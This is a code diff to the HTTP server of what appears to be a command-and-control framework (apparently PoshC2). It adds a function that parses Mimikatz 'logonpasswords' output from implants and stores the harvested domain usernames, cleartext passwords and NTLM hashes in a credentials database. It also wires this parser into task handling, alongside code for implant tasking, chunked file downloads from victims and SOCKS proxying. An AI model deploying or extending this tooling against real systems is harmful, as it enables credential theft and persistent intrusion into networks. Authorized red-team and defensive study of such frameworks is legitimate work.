@@ -8,7 +8,7 @@ from Tasks import newTask
 from Core import decrypt, encrypt, default_response, decrypt_bytes_gzip
 from Colours import Colours
 from DB import select_item, get_implants_all, update_implant_lastseen, update_task, get_cmd_from_task_id, get_c2server_all, get_sharpurls
-from DB import update_item, get_task_owner, get_newimplanturl, initializedb, setupserver, new_urldetails, get_baseenckey
+from DB import update_item, get_task_owner, get_newimplanturl, initializedb, setupserver, new_urldetails, get_baseenckey, insert_cred
 from Payloads import Payloads
 from Config import ROOTDIR, ServerHeader, PayloadsDirectory, HTTPResponse, DownloadsDirectory, Database, HostnameIP, SocksHost
 from Config import QuickCommand, KillDate, DefaultSleep, DomainFrontHeader, ServerPort, urlConfig, HOST_NAME, PORT_NUMBER
@@ -21,6 +21,41 @@ from Utils import validate_sleep_time, randomuri, gen_key
 from socketserver import ThreadingMixIn
 
 from http.server import BaseHTTPRequestHandler, HTTPServer
+
+
+def process_mimikatz(lines):
+    # code source https://github.com/stufus/parse-mimikatz-log/blob/master/pml.py
+    main_count = 0
+    current = {}
+    for line in lines.split('\n'):
+        main_count += 1
+        val = re.match(r'^\s*\*\s+Username\s+:\s+(.+)\s*$', line.strip())
+        if val is not None:
+            current = {}
+            current['Username'] = val.group(1).strip()
+            if current['Username'] == '(null)':
+                current['Username'] = None
+            continue
+
+        val = re.match(r'^\s*\*\s+Domain\s+:\s+(.+)\s*$', line.strip())
+        if val is not None:
+            current['Domain'] = val.group(1).strip()
+            if current['Domain'] == '(null)':
+                current['Domain'] = None
+            continue
+
+        val = re.match(r'^\s*\*\s+(NTLM|Password)\s+:\s+(.+)\s*$', line.strip())
+        if val is not None and "Username" in current and "Domain" in current:
+            if val.group(2).count(" ") < 10:
+                current[val.group(1).strip()] = val.group(2)
+                if val.group(1) == "Password":
+                    if val.group(2) == '(null)':
+                        continue
+                    insert_cred(current['Domain'], current['Username'], current['Password'], None)
+                elif val.group(1) == "NTLM":
+                    if val.group(2) == '(null)':
+                        continue
+                    insert_cred(current['Domain'], current['Username'], None, current['NTLM'])
 
 
 class MyHandler(BaseHTTPRequestHandler):
@@ -87,7 +122,7 @@ class MyHandler(BaseHTTPRequestHandler):
                 s.send_header("Content-Length", len(sharpout))
                 s.end_headers()
                 if (len(sharpout) > 0):
-                  s.wfile.write(sharpout)
+                    s.wfile.write(sharpout)
             except HTTPError as e:
                 s.send_response(e.code)
                 s.send_header("Content-type", "text/html")
@@ -321,7 +356,7 @@ class MyHandler(BaseHTTPRequestHandler):
                     try:
                         outputParsed = re.sub(r'123456(.+?)654321', '', rawoutput)
                         outputParsed = outputParsed.rstrip()
-                    except:
+                    except Exception:
                         pass
 
                     if "loadmodule" in executedCmd:
@@ -357,13 +392,13 @@ class MyHandler(BaseHTTPRequestHandler):
                             filename = filename.rstrip('\x00')
                             original_filename = filename
                             try:
-                                if rawoutput.startswith("Error"): 
+                                if rawoutput.startswith("Error"):
                                     print("Error downloading file: ")
                                     print(rawoutput)
                                     break
                                 chunkNumber = rawoutput[:5]
                                 totalChunks = rawoutput[5:10]
-                            except:
+                            except Exception:
                                 chunkNumber = rawoutput[:5].decode("utf-8")
                                 totalChunks = rawoutput[5:10].decode("utf-8")
 
@@ -399,7 +434,7 @@ class MyHandler(BaseHTTPRequestHandler):
                             output_file = open('%s/downloads/%s' % (ROOTDIR, filename), 'ab')
                             try:
                                 output_file.write(rawoutput[10:])
-                            except:
+                            except Exception:
                                 output_file.write(rawoutput[10:].encode("utf-8"))
                             output_file.close()
                         except Exception as e:
@@ -419,12 +454,20 @@ class MyHandler(BaseHTTPRequestHandler):
                             update_task(taskId, message)
                             print(message)
 
+                    elif executedCmd.lower().startswith("invoke-mimikatz") and "logonpasswords" in outputParsed:
+                        print("Parsing Mimikatz Output")
+                        process_mimikatz(outputParsed)
+                        update_task(taskId, outputParsed)
+                        print(Colours.GREEN)
+                        print(outputParsed + Colours.END)
+
                     else:
                         update_task(taskId, outputParsed)
                         print(Colours.GREEN)
                         print(outputParsed + Colours.END)
+
         except Exception as e:
-            print (e)
+            print(e)
             traceback.print_exc()
             pass
 
@@ -439,7 +482,7 @@ class MyHandler(BaseHTTPRequestHandler):
                     sharplist.append("/" + i)
 
                 if any(UriPath in s for s in sharplist):
-                    try:                       
+                    try:
                         open("%swebserver.log" % ROOTDIR, "a").write("[+] Making POST connection to SharpSocks %s%s\r\n" % (SocksHost, UriPath))
                         r = Request("%s%s" % (SocksHost, UriPath), headers={'Cookie': '%s' % s.cookieHeader, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36'})
                         res = urlopen(r, post_data)
@@ -470,10 +513,12 @@ class MyHandler(BaseHTTPRequestHandler):
                     s.send_header("Content-type", "text/html")
                     s.end_headers()
                     s.wfile.write(default_response())
-            except Exception as e:
-                print ("Generic Error in SharpSocks")
+            except Exception:
+                print("Generic Error in SharpSocks")
+
 
 ThreadingMixIn.daemon_threads = True
+
 
 class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
     """Handle requests in a separate thread."""
